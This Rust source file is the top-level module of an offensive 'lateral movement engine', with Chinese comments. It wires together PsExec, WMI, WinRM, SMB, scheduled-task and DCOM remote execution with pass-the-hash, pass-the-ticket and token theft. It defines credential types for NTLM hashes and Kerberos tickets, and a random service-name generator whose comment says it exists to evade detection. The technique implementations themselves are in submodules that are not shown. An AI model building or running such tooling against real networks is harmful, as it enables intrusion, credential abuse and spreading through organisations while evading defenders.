//! 横向移动引擎模块
//!
//! 本模块实现了报告中描述的所有横向移动技术：
//!
//! - PsExec: 通过SMB ADMIN$共享上传服务进行远程执行
//! - WMI: 通过Windows Management Instrumentation远程创建进程
//! - WinRM: 通过WS-Management协议远程执行PowerShell
//! - SMB执行: 通过SMB共享执行命令
//! - 计划任务: 通过远程计划任务创建执行
//! - DCOM: 通过分布式COM远程执行
//! - Pass-the-Hash: 使用NTLM哈希进行认证
//! - Pass-the-Ticket: 使用Kerberos票据进行认证
//! - Token窃取/模拟: 窃取其他进程的安全令牌

pub mod dcom;
pub mod psexec;
pub mod pth;
pub mod ptt;
pub mod schtasks;
pub mod smb_exec;
pub mod token;
pub mod winrm;
pub mod wmi;

use serde::{Deserialize, Serialize};
use std::time::Duration;

// ============================================================
// 横向移动数据类型
// ============================================================

/// 横向移动方法
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum LateralMethod {
    /// PsExec (SMB + 服务创建)
    PsExec,
    /// WMI进程创建
    WmiExec,
    /// WinRM PowerShell远程执行
    WinRmExec,
    /// SMB共享执行（不创建服务）
    SmbExec,
    /// 计划任务远程创建
    SchTasks,
    /// DCOM远程执行
    DcomExec,
}

impl std::fmt::Display for LateralMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            LateralMethod::PsExec => write!(f, "PsExec"),
            LateralMethod::WmiExec => write!(f, "WMI"),
            LateralMethod::WinRmExec => write!(f, "WinRM"),
            LateralMethod::SmbExec => write!(f, "SMB"),
            LateralMethod::SchTasks => write!(f, "计划任务"),
            LateralMethod::DcomExec => write!(f, "DCOM"),
        }
    }
}

/// 横向移动认证凭据
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum LateralCredential {
    /// 明文密码
    Cleartext {
        username: String,
        password: String,
        domain: Option<String>,
    },
    /// NTLM哈希 (Pass-the-Hash)
    NtlmHash {
        username: String,
        nthash: String,
        domain: Option<String>,
    },
    /// Kerberos票据 (Pass-the-Ticket)
    KerberosTicket {
        ticket_data: Vec<u8>,
        /// Base64编码的kirbi/b64票据
        ticket_base64: Option<String>,
    },
    /// 使用当前进程令牌
    CurrentToken,
}

/// 横向移动配置
#[derive(Debug, Clone)]
pub struct LateralConfig {
    /// 目标主机（IP或主机名）
    pub target: String,
    /// 横向移动方法
    pub method: LateralMethod,
    /// 要执行的命令
    pub command: String,
    /// 命令参数
    pub args: Vec<String>,
    /// 认证凭据
    pub credential: LateralCredential,
    /// 超时（秒）
    pub timeout_secs: u64,
    /// 服务名（PsExec，为空则随机生成）
    pub service_name: Option<String>,
    /// 是否使用加密连接
    pub use_encryption: bool,
    /// 是否显示窗口（交互式）
    pub show_window: bool,
}

impl Default for LateralConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            method: LateralMethod::PsExec,
            command: "cmd.exe".to_string(),
            args: vec!["/c".to_string(), "whoami".to_string()],
            credential: LateralCredential::CurrentToken,
            timeout_secs: 60,
            service_name: None,
            use_encryption: true,
            show_window: false,
        }
    }
}

impl LateralConfig {
    /// 创建PsExec配置
    pub fn psexec(target: &str, command: &str) -> Self {
        Self {
            target: target.to_string(),
            method: LateralMethod::PsExec,
            command: command.to_string(),
            ..Default::default()
        }
    }

    /// 创建WMI配置
    pub fn wmi(target: &str, command: &str) -> Self {
        Self {
            target: target.to_string(),
            method: LateralMethod::WmiExec,
            command: command.to_string(),
            ..Default::default()
        }
    }

    /// 创建WinRM配置
    pub fn winrm(target: &str, command: &str) -> Self {
        Self {
            target: target.to_string(),
            method: LateralMethod::WinRmExec,
            command: "powershell.exe".to_string(),
            args: vec!["-Command".to_string(), command.to_string()],
            ..Default::default()
        }
    }

    /// 使用明文密码认证
    pub fn with_password(mut self, username: &str, password: &str, domain: Option<&str>) -> Self {
        self.credential = LateralCredential::Cleartext {
            username: username.to_string(),
            password: password.to_string(),
            domain: domain.map(|s| s.to_string()),
        };
        self
    }

    /// 使用NTLM哈希认证 (Pass-the-Hash)
    pub fn with_ntlm_hash(mut self, username: &str, nthash: &str, domain: Option<&str>) -> Self {
        self.credential = LateralCredential::NtlmHash {
            username: username.to_string(),
            nthash: nthash.to_string(),
            domain: domain.map(|s| s.to_string()),
        };
        self
    }

    /// 使用Kerberos票据认证 (Pass-the-Ticket)
    pub fn with_ticket(mut self, ticket_data: Vec<u8>) -> Self {
        self.credential = LateralCredential::KerberosTicket {
            ticket_data,
            ticket_base64: None,
        };
        self
    }
}

/// 横向移动执行结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LateralResult {
    /// 是否成功
    pub success: bool,
    /// 目标主机
    pub target: String,
    /// 使用方法
    pub method: String,
    /// 执行的命令
    pub command: String,
    /// 命令输出
    pub stdout: String,
    /// 错误输出
    pub stderr: String,
    /// 退出码
    pub exit_code: i32,
    /// 执行耗时（毫秒）
    pub elapsed_ms: u64,
    /// 建立的会话ID（如果有）
    pub session_id: Option<String>,
}

// ============================================================
// 横向移动管理器
// ============================================================

/// 横向移动管理器
pub struct LateralManager {
    config: LateralConfig,
}

impl LateralManager {
    pub fn new(config: LateralConfig) -> Self {
        Self { config }
    }

    /// 执行横向移动
    pub async fn execute(&self) -> Result<LateralResult, String> {
        let start = std::time::Instant::now();

        let result = match self.config.method {
            LateralMethod::PsExec => psexec::execute_psexec(&self.config).await,
            LateralMethod::WmiExec => wmi::execute_wmi(&self.config).await,
            LateralMethod::WinRmExec => winrm::execute_winrm(&self.config).await,
            LateralMethod::SmbExec => smb_exec::execute_smb_exec(&self.config).await,
            LateralMethod::SchTasks => schtasks::execute_schtasks(&self.config).await,
            LateralMethod::DcomExec => dcom::execute_dcom(&self.config).await,
        };

        let elapsed = start.elapsed().as_millis() as u64;

        match result {
            Ok((stdout, stderr, exit_code)) => {
                Ok(LateralResult {
                    success: exit_code == 0,
                    target: self.config.target.clone(),
                    method: self.config.method.to_string(),
                    command: format!("{} {}", self.config.command, self.config.args.join(" ")),
                    stdout,
                    stderr,
                    exit_code,
                    elapsed_ms: elapsed,
                    session_id: None,
                })
            }
            Err(e) => {
                Ok(LateralResult {
                    success: false,
                    target: self.config.target.clone(),
                    method: self.config.method.to_string(),
                    command: format!("{} {}", self.config.command, self.config.args.join(" ")),
                    stdout: String::new(),
                    stderr: e,
                    exit_code: -1,
                    elapsed_ms: elapsed,
                    session_id: None,
                })
            }
        }
    }
}

/// 生成随机服务名（规避检测）
pub fn random_service_name() -> String {
    let adjectives = ["Win", "Sys", "Net", "Sec", "Core", "Data", "App", "Svc"];
    let nouns = ["Mgr", "Mon", "Svc", "Helper", "Agent", "Host", "Update", "Cache"];

    let adj = adjectives[fast_rand_idx(adjectives.len())];
    let noun = nouns[fast_rand_idx(nouns.len())];
    let num: u16 = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as u16)
        .unwrap_or(42))
        % 999;

    format!("{}{}{}", adj, noun, num)
}

fn fast_rand_idx(max: usize) -> usize {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let hash = RandomState::new().build_hasher().finish();
    (hash as usize) % max
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_lateral_method_display() {
        assert_eq!(LateralMethod::PsExec.to_string(), "PsExec");
        assert_eq!(LateralMethod::WmiExec.to_string(), "WMI");
        assert_eq!(LateralMethod::WinRmExec.to_string(), "WinRM");
    }

    #[test]
    fn test_lateral_config_default() {
        let config = LateralConfig::default();
        assert_eq!(config.method, LateralMethod::PsExec);
        assert!(config.use_encryption);
        assert_eq!(config.timeout_secs, 60);
    }

    #[test]
    fn test_lateral_config_builder() {
        let config = LateralConfig::psexec("10.0.0.5", "whoami")
            .with_password("admin", "P@ssw0rd!", Some("CORP"));
        assert_eq!(config.target, "10.0.0.5");
        assert!(matches!(config.credential, LateralCredential::Cleartext { .. }));
    }

    #[test]
    fn test_lateral_config_pth() {
        let config = LateralConfig::wmi("dc01", "cmd /c ipconfig")
            .with_ntlm_hash("Administrator", "aad3b435b51404eeaad3b435b51404ee", Some("CORP"));
        assert!(matches!(config.credential, LateralCredential::NtlmHash { .. }));
    }

    #[test]
    fn test_random_service_name() {
        let name1 = random_service_name();
        let name2 = random_service_name();
        assert!(!name1.is_empty());
        assert!(!name2.is_empty());
    }
}
